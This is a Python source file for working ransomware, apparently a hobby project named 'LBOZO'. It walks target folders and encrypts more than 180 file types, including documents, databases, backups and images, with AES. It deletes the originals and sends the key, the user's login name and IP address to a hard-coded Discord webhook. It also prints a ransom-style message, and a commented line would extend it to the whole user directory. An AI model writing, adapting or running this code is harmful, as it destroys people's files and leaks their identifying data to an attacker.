from ast import Num
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from pathlib import Path
import logging
import concurrent.futures
import string
import os
import random
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from discord_webhook import DiscordWebhook
import socket
from os.path import dirname, abspath

#os.chdir(dirname(abspath(__file__)))
os.system("cd ..")
print(os.getcwd())

if os.path.exists("./keys"):
    pass
else:
    os.mkdir("./keys")

global keypath
keypath = "./keys/"


def generate_keys():
    key = RSA.generate(2048)
    privatekey = key.export_key()
    with open(f"{keypath}private.pem", "wb") as file:
        file.write(privatekey)
    publickey = key.publickey().export_key()
    with open(f"{keypath}public.pem", "wb") as file:
        file.write(publickey)


if os.path.exists(f"{keypath}private.pem") and os.path.exists(f"{keypath}public.pem"):
    pass
else:
    generate_keys()

BLOCK_SIZE = 16
BLOCK_MULTIPLIER = 100

global ALPHABET
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.1234567890"

maxWorker = 100


def get_files(os_type):
    if os_type == "Windows":
        desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")


def encrypt_keyfile():
    encrypt_key = RSA.import_key(open(f"{keypath}public.pem").read())
    cipher_rsa = PKCS1_OAEP.new(encrypt_key)
    with open(f"{keypath}filekey.key", "rb") as file:
        content = file.read()
    encrypted_content = cipher_rsa.encrypt(content)
    with open(f"{keypath}filekey.key", "wb") as file2:
        file2.write(encrypted_content)


def decypt_keyfile():
    private_key = RSA.import_key(open(f"{keypath}private.pem").read())
    cipher_rsa = PKCS1_OAEP.new(private_key)
    with open(f"{keypath}filekey.key", "rb") as file:
        content = file.read()
    decrypted_content = cipher_rsa.decrypt(content)
    with open(f"{keypath}filekey.key", "wb") as file2:
        file2.write(decrypted_content)
    with open(f"{keypath}filekey.key", "rb") as file3:
        key = file3.read()


def generateKey(length, key):
    retKey = str()
    for i in range(length):
        retKey += key[i % len(key)]
    return retKey


def vencrypt(msg, key):
    key = generateKey(len(msg), key)
    ciphertext = "E"
    for index, char in enumerate(msg):
        ciphertext += ALPHABET[
            (ALPHABET.find(key[index]) + ALPHABET.find(char)) % len(ALPHABET)
        ]
    return ciphertext


def vdecrypt(ciphertext, key):
    key = generateKey(len(ciphertext), key)
    msg = str()
    ciphertext = ciphertext[1:]
    for index, char in enumerate(ciphertext):
        msg += ALPHABET[
            (ALPHABET.find(char) - ALPHABET.find(key[index])) % len(ALPHABET)
        ]
    return msg


def encryptFile(filePath, password):
    try:
        logging.info("Started encoding: " + filePath.resolve().as_posix())
        hashObj = SHA256.new(password.encode("utf-8"))
        hkey = hashObj.digest()
        encryptPath = Path(
            filePath.parent.resolve().as_posix()
            + "/"
            + vencrypt(filePath.name, password)
            + ".LBOZO"
        )
        if encryptPath.exists():
            encryptPath.unlink()
        with open(filePath, "rb") as input_file, encryptPath.open("ab") as output_file:
            content = b""
            content = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

            while content != b"":
                output_file.write(encrypt(hkey, content))
                content = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

            logging.info("Encoded " + filePath.resolve().as_posix())
            logging.info("To " + encryptPath.resolve().as_posix())
    except Exception as e:
        print(e)


def decryptFile(filePath, password):
    logging.info("Started decoding: " + filePath.resolve().as_posix())
    try:
        hashObj = SHA256.new(password.encode("utf-8"))
        hkey = hashObj.digest()
        decryptFilePath = Path(
            filePath.parent.resolve().as_posix()
            + "/"
            + vdecrypt(filePath.name, password)[:-6]
        )
        if decryptFilePath.exists():
            decryptFilePath.unlink()
        with filePath.open("rb") as input_file, decryptFilePath.open(
            "ab"
        ) as output_file:
            values = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)
            while values != b"":
                output_file.write(decrypt(hkey, values))
                values = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

        logging.info("Decoded: " + filePath.resolve().as_posix()[:-4])
        logging.info("TO: " + decryptFilePath.resolve().as_posix())

    except Exception as e:
        print(e)


def pad(msg, BLOCK_SIZE, PAD):
    return msg + PAD * ((BLOCK_SIZE - len(msg) % BLOCK_SIZE) % BLOCK_SIZE)


def encrypt(key, msg):
    PAD = b"\0"
    cipher = AES.new(key, AES.MODE_ECB)
    result = cipher.encrypt(pad(msg, BLOCK_SIZE, PAD))
    return result


def decrypt(key, msg):
    PAD = b"\0"
    decipher = AES.new(key, AES.MODE_ECB)
    pt = decipher.decrypt(msg)
    for i in range(len(pt) - 1, -1, -1):
        if pt[i] == PAD:
            pt = pt[:i]
        else:
            break
    return pt


def getMaxLen(arr):
    maxLen = 0
    for elem in arr:
        if len(elem) > maxLen:
            maxLen = len(elem)
    return maxLen


def getTargetFiles(fileExtension):
    fileExtensions = []
    if len(fileExtension) == 0:
        fileExtensions.append("*")
    else:
        for Extension in fileExtension:
            fileExtensionFormatted = "*."
            for char in Extension:
                fileExtensionFormatted += "[" + char + "]"
            fileExtensions.append(fileExtensionFormatted)

    return fileExtensions


def generateEncryptThreads(fileExtensions, password, removeFiles, path):
    fileExtensionFormatted = getTargetFiles(fileExtensions)
    filePaths = []
    for fileExtension in fileExtensionFormatted:
        filePaths = filePaths + list(Path(path).rglob(fileExtension))

    with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
        for filePath in filePaths:
            global encryptCount
            encryptCount = len(filePaths)
            executor.submit(encryptFile, *(filePath, password))
    if removeFiles:
        for filePath in filePaths:
            filePath.unlink()


def generateDecryptThreads(password, removeFiles, path):
    filePaths = list(Path(path).rglob("*.[lL][bB][oO][zZ][oO]"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
        for filePath in filePaths:
            executor.submit(decryptFile, *(filePath, password))
    if removeFiles:
        for filePath in filePaths:
            filePath.unlink()


def removeEncryptedFiles(path):
    filePaths = list(Path(path).rglob("*.[eE][nN][cC]"))
    for filePath in filePaths:
        filePath.unlink()


def removeExFiles(fileExtensions, path):
    fileExtensionFormatted = getTargetFiles(fileExtensions)
    filePaths = []
    for fileExtension in fileExtensionFormatted:
        filePaths = filePaths + list(Path(path).rglob(fileExtension))
    for filePath in filePaths:
        filePath.unlink()


chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
if os.path.exists(f"{keypath}filekey.key"):
    decypt_keyfile()
    pass
else:
    with open(f"{keypath}filekey.key", "wb") as filekey:
        for x in range(0, 16):
            password = "".join(random.SystemRandom().choice(chars) for _ in range(x))
        filekey.write(password.encode())

fileExtensions = [
    "DOC",
    "DOCX",
    "XLS",
    "XLSX",
    "PPT",
    "PPTX",
    "PST",
    "OST",
    "MSG",
    "EML",
    "VSD",
    "VSDX",
    "TXT",
    "CSV",
    "RTF",
    "WKS",
    "WK1",
    "PDF",
    "DWG",
    "ONETOC2",
    "SNT",
    "JPEG",
    "JPG",
    "DOCB",
    "DOCM",
    "DOT",
    "DOTM",
    "DOTX",
    "XLSM",
    "XLSB",
    "XLW",
    "XLT",
    "XLM",
    "XLC",
    "XLTX",
    "XLTM",
    "PPTM",
    "POT",
    "PPS",
    "PPSM",
    "PPSX",
    "PPAM",
    "POTX",
    "POTM",
    "EDB",
    "HWP",
    "602",
    "SXI",
    "STI",
    "SLDX",
    "SLDM",
    "VDI",
    "VMDK",
    "VMX",
    "GPG",
    "AES",
    "ARC",
    "PAQ",
    "BZ2",
    "TBK",
    "BAK",
    "TAR",
    "TGZ",
    "GZ",
    "7Z",
    "RAR",
    "ZIP",
    "BACKUP",
    "ISO",
    "VCD",
    "BMP",
    "PNG",
    "GIF",
    "RAW",
    "CGM",
    "TIF",
    "TIFF",
    "NEF",
    "PSD",
    "AI",
    "SVG",
    "DJVU",
    "M4U",
    "M3U",
    "MID",
    "WMA",
    "FLV",
    "3G2",
    "MKV",
    "3GP",
    "MP4",
    "MOV",
    "AVI",
    "ASF",
    "MPEG",
    "VOB",
    "MPG",
    "WMV",
    "FLA",
    "SWF",
    "WAV",
    "MP3",
    "SH",
    "CLASS",
    "JAR",
    "JAVA",
    "RB",
    "ASP",
    "PHP",
    "JSP",
    "BRD",
    "SCH",
    "DCH",
    "DIP",
    "PL",
    "VB",
    "VBS",
    "PS1",
    "BAT",
    "CMD",
    "JS",
    "ASM",
    "H",
    "PAS",
    "CPP",
    "C",
    "CS",
    "SUO",
    "SLN",
    "LDF",
    "MDF",
    "IBD",
    "MYI",
    "MYD",
    "FRM",
    "ODB",
    "DBF",
    "DB",
    "MDB",
    "ACCDB",
    "SQL",
    "SQLITEDB",
    "SQLITE3",
    "ASC",
    "LAY6",
    "LAY",
    "MML",
    "SXM",
    "OTG",
    "ODG",
    "UOP",
    "STD",
    "SXD",
    "OTP",
    "ODP",
    "WB2",
    "SLK",
    "DIF",
    "STC",
    "SXC",
    "OTS",
    "ODS",
    "3DM",
    "MAX",
    "3DS",
    "UOT",
    "STW",
    "SXW",
    "OTT",
    "ODT",
    "P12",
    "CSR",
    "CRT",
    "PFX",
    "DER",
    "EXE",
]

removeFiles = True

#   userdata = os.path.expanduser("~")

paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]

#   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
#   paths.append(userdata)


format = "%(asctime)s: %(message)s"
logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
with open(f"{keypath}filekey.key", "rb") as filekey:
    password = filekey.read().decode()

print(password)
encrypt_keyfile()

if os.path.exists(f"{keypath}finished.done"):
    pass
else:
    hostname = socket.gethostname()
    for x in paths:
        path = x
        startTime = time.time()
        generateEncryptThreads(fileExtensions, password, removeFiles, path)
        endTime = time.time()
        webhook = DiscordWebhook(
            url="https://discord.com/api/webhooks/990727870055845959/BQM38M7KSMnMNEA3yuJ1PvlkFjdfMgU4Eaij-Pf8AeRABPmgwGS_9JGtKSHcY7_XOPMm",
            content=f"Decryption Key Generated\n`{password}`\nThis key belongs to:\n`{os.getlogin()}, {socket.gethostbyname(hostname)}`\nThis key is valid for `{encryptCount}` files\nTime to encypt: `{int(endTime - startTime)} seconds`",
        )
        webhook.execute()
    with open(f"{keypath}finished.done", "w") as finished:
        finished.close()


print(f"Oh no! Your files have been encrypted!")

#   this is where you would traditionally call a ransom, we are instead just asking for a password that will be used to decrypt the files
#   ransom()

decryptend = input("Enter password to decrypt: ")
if decryptend == password:
    for x in paths:
        path = x
        generateDecryptThreads(password, removeFiles, path)
    os.remove(f"{keypath}filekey.key")
    os.remove(f"{keypath}private.pem")
    os.remove(f"{keypath}public.pem")
    os.remove(f"{keypath}finished.done")
else:
    print("Oops! Wrong password!")
    exit()
